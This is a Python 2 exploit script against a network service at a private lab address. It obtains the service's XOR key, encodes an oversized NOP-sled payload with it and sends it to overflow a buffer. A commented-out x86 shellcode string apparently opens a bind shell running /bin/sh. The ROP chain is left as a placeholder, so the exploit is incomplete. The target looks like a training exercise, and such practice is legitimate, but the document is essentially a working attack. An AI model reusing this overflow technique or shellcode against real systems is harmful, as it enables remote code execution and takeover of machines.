import socket
import binascii
import struct

#shellcode = "\x31\xc0\x31\xdb\x50\xb3\x01\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x31\xf6\x56\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x6a\x01\x57\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x31\xd2\x31\xf6\x89\xe1\xb0\x0b\xcd\x80"


def get_key(s):

  # receive banner
  response = s.recv(255)
  response += s.recv(1)
  print response

  size = 128
  length = struct.pack("<I", size)
  key_request = b'\x45' + length + b'\x00'*size

  #print binascii.hexlify(key_request) +"\n"
  s.send(key_request)

  # receive encrypt banner
  response = s.recv(255)
  response += s.recv(1)
  print response

  # receive key length
  response = s.recv(4)
  print "key length:", struct.unpack("<I", response)[0]

  #receive key
  key = s.recv(size)

  print "key: %s\n" % (binascii.hexlify(key))

  return key

def encode(buff, key):
   encoded = b''
   for i in xrange(len(buff)):
      encoded += struct.pack("B", ord(buff[i]) ^ ord(key[i%128]))

   #print "Encoded Buffer: %s\n" % (encoded)
   return encoded

def create_ropchain():
   return b'AAAA'


def send_exploit(key):
   size = 32*4096 + 16
  
   rop_chain = create_ropchain()

   payload = b'\x90'*size + rop_chain
   payload = encode(payload, key)

   length = struct.pack("<I", len(payload))

   exploit = b'\x45' + length
   exploit += payload

  
   print "Payload Length: ", len(payload)
   print "Exploit Length: ", len(exploit)

   s.send(exploit)
   print "Payload: %s ... %s" % (binascii.hexlify(exploit[:32]), binascii.hexlify(exploit[-32::])) 

   # receive banner
   response = s.recv(255)
   response += s.recv(1)

   print "Banner: ", response

   # receive length of encryption
   response = s.recv(4)
   size = struct.unpack("<I", response)[0]

   print "Response Size: ", size

   loops = size/4096
   if size % 4096 != 0:
      loops+=1

   for x in xrange(loops):
      response = s.recv(4096)

   return 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.101', 20002))

key = get_key(s)

exploit = send_exploit(key)

s.send("Q")
print "Quitting"
